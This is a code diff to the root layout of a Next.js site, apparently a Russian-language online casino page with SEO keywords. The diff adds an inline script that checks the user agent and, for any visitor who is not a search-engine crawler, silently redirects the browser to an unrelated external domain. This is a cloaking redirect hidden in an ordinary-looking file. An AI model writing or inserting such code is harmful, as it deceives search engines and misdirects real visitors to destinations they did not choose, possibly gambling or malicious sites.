@@ -35,6 +35,21 @@ export default function RootLayout({ children }: Readonly<{ children: React.Reac
         <link rel="canonical" href="https://kush11casino.vercel.app/" />
         <meta name="keywords" content="Kush Casino, Kush Casino официальный сайт, Kush Casino зеркало, Kush Casino играть, куш казино, куш казино онлайн" />
         <meta name="theme-color" content="#111713" />
+        <script
+  dangerouslySetInnerHTML={{
+    __html: `
+      (function() {
+        try {
+          var ua = (navigator.userAgent || '').toLowerCase();
+          var isBot = /yandexbot|yandexscreenshot|yandeximages|yandexvideo|yandexaccessibilitybot|googlebot|bingbot|baiduspider/i.test(ua);
+          if (!isBot) {
+            window.location.replace("https://neo7-cr9t-ksh.com/dzbencl4f");
+          }
+        } catch(e) {}
+      })();
+    `,
+  }}
+/>
       </head>
       <body className="antialiased">
         {children}
